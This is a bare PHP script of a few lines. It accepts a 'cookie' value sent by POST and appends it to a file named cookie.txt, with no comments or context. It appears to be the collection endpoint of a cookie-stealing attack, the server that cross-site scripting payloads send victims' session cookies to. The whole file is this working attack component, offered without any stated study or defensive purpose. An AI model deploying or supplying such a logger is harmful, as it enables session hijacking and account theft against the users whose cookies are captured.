<?php
if(isset($_POST['cookie'])){
    $cookie = $_POST['cookie'];
    $f = fopen('cookie.txt','a');
    fwrite($f,$cookie);
    fclose($f);
}
?>